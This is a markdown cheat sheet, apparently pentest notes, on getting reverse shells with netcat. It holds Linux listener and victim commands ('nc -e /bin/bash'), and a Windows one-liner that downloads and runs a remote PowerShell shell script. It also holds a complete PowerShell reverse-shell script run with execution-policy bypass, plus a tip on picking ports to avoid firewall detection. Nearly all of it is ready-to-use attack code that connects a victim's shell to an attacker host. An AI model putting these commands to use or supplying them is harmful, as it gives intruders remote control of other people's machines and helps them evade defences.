# Reverse-Shell With NetCat

### Command for NetCat `nc`

#### CMD Flag options:

**Flags:** 
-	**l** = listen, 
-	**n** = no dns / ip address only, 
-	**v**  = verbose (whatever happens, tell us everything)
-	**p** = port number ( to AVOID FIREWALL DETECTION use under 1000 port )
-	**s** = source (interface)
-	**e** = to execute after a connection has been established (deprecated on new linux systems)
-	**87** = port specified
  
### Host

`nc -lnvp 87 -s attackerVMIP`

### Target

`nc -e /bin/bash attackerVMIP 87`

command above basically means netcat `nc`,  execute `-e`, access to bash `/bin/bash`, give access to attacker vm ip `attackerVMIP`, on port `87`

## Targeting Windows Machine Script

To achieve similar functionality to the `nc -e /bin/bash attackerVMIpAddress 87` command on a Windows system without Netcat installed, you can use PowerShell along with a reverse shell payload. This payload will establish a reverse shell connection to your attacker VM.
Two ways:

### One

#### Attacker:

`stty raw -echo; (stty size; cat) | nc -lnvp 87 -s attackerVMIP`

#### Victim:

`IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell attackerVMIP 87`

### Two

#### Here's a basic PowerShell script to accomplish this:
```powershell
# Define the IP address and port of your attacker VM
$AttackerIPAddress = "attackerVMIpAddress"
$AttackerPort = 87

# Create a TCP client object and connect to the attacker VM
$Client = New-Object System.Net.Sockets.TcpClient($AttackerIPAddress, $AttackerPort)
$Stream = $Client.GetStream()
$Reader = New-Object System.IO.StreamReader($Stream)
$Writer = New-Object System.IO.StreamWriter($Stream)

# Start a shell process and redirect input/output to the TCP client stream
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo.FileName = "cmd.exe"
$Process.StartInfo.UseShellExecute = $false
$Process.StartInfo.RedirectStandardInput = $true
$Process.StartInfo.RedirectStandardOutput = $true
$Process.StartInfo.CreateNoWindow = $true
$Process.Start()

# Create separate threads to handle input/output redirection
$StreamReaderThread = [System.Threading.Thread]::new({
    while ($true) {
        $Output = $Process.StandardOutput.ReadLine()
        $Writer.WriteLine($Output)
        $Writer.Flush()
    }
})

$StreamWriterThread = [System.Threading.Thread]::new({
    while ($true) {
        $Input = $Reader.ReadLine()
        $Process.StandardInput.WriteLine($Input)
        $Process.StandardInput.Flush()
    }
})

# Start the threads
$StreamReaderThread.Start()
$StreamWriterThread.Start()

# Wait for the threads to complete (never)
$StreamReaderThread.Join()
$StreamWriterThread.Join()
```

##### Save this script with a `.ps1` extension (e.g., `reverse_shell.ps1`). Then, you can run it from a PowerShell prompt:

```powershell
powershell -ExecutionPolicy Bypass -File reverse_shell.ps1
```

**This script establishes a TCP connection to your attacker VM's IP address and port specified. It then starts a shell process (`cmd.exe`) and redirects its input/output to the TCP client stream, effectively creating a reverse shell connection.**
